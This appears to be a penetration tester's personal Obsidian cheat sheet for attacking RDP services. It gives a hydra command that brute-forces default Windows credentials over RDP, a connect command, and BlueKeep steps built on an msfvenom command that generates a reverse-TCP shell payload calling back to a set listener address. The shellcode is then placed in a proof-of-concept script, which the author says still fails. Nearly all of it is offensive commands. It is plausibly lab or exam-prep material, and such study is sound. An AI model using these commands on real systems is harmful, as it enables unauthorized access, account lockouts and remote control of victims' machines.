#service 
<% tp.file.rename("1_RDP_")%>
☑️
> Auch ms-wbt-server


## Bruteforce default credentials
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt rdp://$hip -vV -t 1 -I -s 3389
```
	CAREFUL, likely to lock accounts!

## Connect to RDP
```bash
connect-windows $hip [$user] [$password]
```

## BlueKeep
<= Windows 7 or <= Windows Server 2008
Payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.206 LPORT=4545 -f py
```
Integrate it at `win7_32_poc.py` where it states "`# replace buf with your shellcode`"
> Currently still fails, a python dependency issue